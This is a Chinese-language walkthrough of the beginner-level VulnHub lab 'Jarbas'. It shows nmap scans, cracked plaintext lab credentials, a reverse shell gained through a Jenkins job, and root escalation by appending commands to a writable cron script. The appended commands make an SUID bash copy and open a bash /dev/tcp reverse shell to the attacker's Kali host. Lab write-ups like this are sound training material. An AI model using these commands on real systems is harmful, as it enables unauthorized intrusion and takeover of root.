### 靶机描述

_这是一台标注难度为初级的靶机。作者希望我获取一个root的shell。对于靶机，作者给出了简单描述，致敬90年代的巴西搜索引擎。_
![des](vulnhubScreenShot/jarbas/Screenshot_2026-07-19_05_34_38.png)
![trans](vulnhubScreenShot/jarbas/2026-07-19-053544_2560x1600_scrot.png)

```
https://download.vulnhub.com/jarbas/Jarbas.zip
```

### 信息收集

#### nmap主机发现
主机发现目标为ip为192.168.2.37，本地kali机子ip为192.168.2.24。

#### nmap 端口扫描
```text
# Nmap 7.98 scan initiated Sun Jul 19 05:37:42 2026 as: /usr/lib/nmap/nmap --min-rate=10000 -sT -p- -oA nmapscan/ports 192.168.2.37
Nmap scan report for 192.168.2.37
Host is up (0.0012s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
8080/tcp open  http-proxy
MAC Address: 00:0C:29:78:82:8F (VMware)

# Nmap done at Sun Jul 19 05:37:47 2026 -- 1 IP address (1 host up) scanned in 4.96 seconds
```
然后针对这几个端口进行普通脚本和详细扫描。
```text
# Nmap 7.98 scan initiated Sun Jul 19 05:41:51 2026 as: /usr/lib/nmap/nmap -sT -sV -O -sC -p22,80,3306,8080 -oA nmapscan/details 192.168.2.37
Nmap scan report for 192.168.2.37
Host is up (0.00084s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 28:bc:49:3c:6c:43:29:57:3c:b8:85:9a:6d:3c:16:3f (RSA)
|   256 a0:1b:90:2c:da:79:eb:8f:3b:14:de:bb:3f:d2:e7:3f (ECDSA)
|_  256 57:72:08:54:b7:56:ff:c3:e6:16:6f:97:cf:ae:7f:76 (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Jarbas - O Seu Mordomo Virtual!
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)
8080/tcp open  http    Jetty 9.4.z-SNAPSHOT
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
MAC Address: 00:0C:29:78:82:8F (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14
Network Distance: 1 hop

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jul 19 05:42:00 2026 -- 1 IP address (1 host up) scanned in 8.73 seconds
```

进行udp常用端口扫描
```text
# Nmap 7.98 scan initiated Sun Jul 19 05:42:36 2026 as: /usr/lib/nmap/nmap --min-rate=10000 --top-ports 20 -oA nmapscan/udps 192.168.2.37
Nmap scan report for 192.168.2.37
Host is up (0.00066s latency).

PORT     STATE  SERVICE
21/tcp   closed ftp
22/tcp   open   ssh
23/tcp   closed telnet
25/tcp   closed smtp
53/tcp   closed domain
80/tcp   open   http
110/tcp  closed pop3
111/tcp  closed rpcbind
135/tcp  closed msrpc
139/tcp  closed netbios-ssn
143/tcp  closed imap
443/tcp  closed https
445/tcp  closed microsoft-ds
993/tcp  closed imaps
995/tcp  closed pop3s
1723/tcp closed pptp
3306/tcp open   mysql
3389/tcp closed ms-wbt-server
5900/tcp closed vnc
8080/tcp open   http-proxy
MAC Address: 00:0C:29:78:82:8F (VMware)

# Nmap done at Sun Jul 19 05:42:36 2026 -- 1 IP address (1 host up) scanned in 0.71 seconds

```
其实应该扫描全端口，但是扫描常用的20个端口，效率更高。目前掌握的信息依旧聚焦于80，22，3306，8080这几个端口。我们需要进一步运行漏洞脚本扫描，来获得是否有"低摘的果子"。

#### web手工测试
80端口跑的是一个看起来很老旧的jarbas页面。
![jarbas](vulnhubScreenShot/jarbas/Screenshot_2026-07-19_05_46_47.png)
在用户登录框(感觉像是登录框)进行1‘注入尝试。但是返回了一个很诡异的页面。
![inject](vulnhubScreenShot/jarbas/kali-linux-2026.1-vmware-amd64-2026-07-19-18-34-09.png)
两个url拼接到一起，感觉这个页面运行的有点问题。不过，都说了90年代的网站，这个情况还是可以理解的。
![regis](vulnhubScreenShot/jarbas/Screenshot_2026-07-19_05_49_31.png)
界面点了许久，没有任何收获。试试8080端口。

#### Jenkins后台登录
![jenkins](vulnhubScreenShot/jarbas/kali-linux-2026.1-vmware-amd64-2026-07-19-18-44-03.png)
这里我打算找找其漏洞信息，或者实在不行试试弱口令。
![vuln](vulnhubScreenShot/jarbas/kali-linux-2026.1-vmware-amd64-2026-07-19-18-46-48.png)
metasploit框架不知为啥移除这个两个漏洞利用脚本。运行exploit-db的镜像脚本。
![debug](vulnhubScreenShot/jarbas/kali-linux-2026.1-vmware-amd64-2026-07-19-19-34-53.png)
脚本跑失败。笔者的ruby水平很垃圾。与其硬着头皮修改脚本，不如用搜索引擎碰碰运气。
jenkins低版本有许多历史漏洞版本。
![exploit](vulnhubScreenShot/jarbas/kali-linux-2026.1-vmware-amd64-2026-07-19-19-45-18.png)
但是文章里面提供的脚本，没有帮上忙。我想会不会跑偏了。




### web网页路径爆破和渗透
![web](vulnhubScreenShot/jarbas/kali-linux-2026.1-vmware-amd64-2026-07-19-19-50-04.png)
index.html是之前看到的页面。而access.html页面是新出现的页面。访问这个页面
![Creds](vulnhubScreenShot/jarbas/Screenshot_2026-07-19_06_06_19.png)
使用网页工具破解哈希值。
![hash](vulnhubScreenShot/jarbas/Screenshot_2026-07-19_01_29_04.png)
这是结果
```text
tiago:italia99
trindade:marianna
eder:vipsu
```
尝试登录8080端口。 _(我试过登录ssh，但是都不对。结果如下)_
![ssh](vulnhubScreenShot/jarbas/2026-07-19-013711_2560x1600_scrot.png)
这是基于密码喷洒的思想，成功登录Jenkins

### 立足点获取
![login](vulnhubScreenShot/jarbas/kali-linux-2026.1-vmware-amd64-2026-07-19-20-24-18.png)
	_(Jenkins系统和wordpress这类系统不同。它是用于自动化管理软件的开发和运维。在item里面我们可以看到git和github的选项。其实这个Jenkins可以自动拿取软件代码运行测试。我们这边更加关注这个系统过程中，有些地方可以执行我们的命令。)_
	
成功登录，对于这类jenkins系统，我们比较关心系统配置之类的操作，如果说能新增加网页解析，那么我们可以轻易的建立一个webshell。这里并不是web系统，但是可以执行反弹shell命令。
这里的new job可以让我们添加一个item
![](vulnhubScreenShot/jarbas/kali-linux-2026.1-vmware-amd64-2026-07-19-20-24-48.png)
有个环境可以让我选择执行shell命令
![shell](vulnhubScreenShot/jarbas/kali-linux-2026.1-vmware-amd64-2026-07-19-20-25-52.png)
![button](vulnhubScreenShot/jarbas/kali-linux-2026.1-vmware-amd64-2026-07-19-20-26-46.png)
_(这里不要忘记点图中那个有绿色箭头的按钮，笔者对jenkins不是很熟，写完reverseshell后，没点按钮，结果一直不回连。卡了好久。)_ 本地监听有结果
![shot](vulnhubScreenShot/jarbas/kali-linux-2026.1-vmware-amd64-2026-07-19-20-26-58.png)


### 权限提升枚举

我先尝试能否读取和修改/etc/shadow文件。如果可以我就可以重置密码。但是行不通。那就搜索历史文件碰碰运气。
![priv](vulnhubScreenShot/jarbas/kali-linux-2026.1-vmware-amd64-2026-07-19-20-27-50.png)
历史记录显示有操作crontab的记录。可能存在定时任务权的漏洞。
查看一下定时任务文件。
![priv1](vulnhubScreenShot/jarbas/kali-linux-2026.1-vmware-amd64-2026-07-19-20-30-24.png)
由于文档是使用的是绝对路径，并且执行环境也写死了。没法使用环境变量提权。但是发现这个CleaningScript.sh文件就是可以读写执行的。于是我选择编辑一下文件。
这里我不知道是怎么回事。如果使用vim和nano编辑会出现混乱。我想采用echo来追加我的命令。
```shell
echo "cp /bin/bash /tmp/rootbash" >> /etc/script/CleaningScript.sh
echo "chmod +xs /tmp/rootbash" >> /etc/script/CleaningScript.sh
/tmp/rootbash -p
```
这个思路我是参考红队笔记Linux提权精讲的文档。
![linux](vulnhubScreenShot/jarbas/kali-linux-2026.1-vmware-amd64-2026-07-19-20-56-10.png)

![priv2](vulnhubScreenShot/jarbas/Pasted.png)
成功提权。

#### 提权 2
第一种方式，结果不是很明显。我们可以往定时任务中写这条测试命令。
```shell
echo '/bin/bash -i >& /dev/tcp/192.168.2.24/4444 0>&1' >> /etc/script/CleaningScript.sh

```
这条命令会通过定时任务在系统中以root身份执行，回弹一个root权限的回合给kali。
等了5分钟。
![success](vulnhubScreenShot/jarbas/kali-linux-2026.1-vmware-amd64-2026-07-19-21-09-51.png)


## 总结
整个渗透测试过程，笔者走了许多弯路。为了查找Jenkins的利用脚本，费了很大功夫。但是其实，在信息收集过程中，笔者在靶机上做的工作是不足的。笔者看到80页面就先入为主的测试手工注入。没有考虑到路径爆破的优先级。结果在跑偏的路上越跑越远。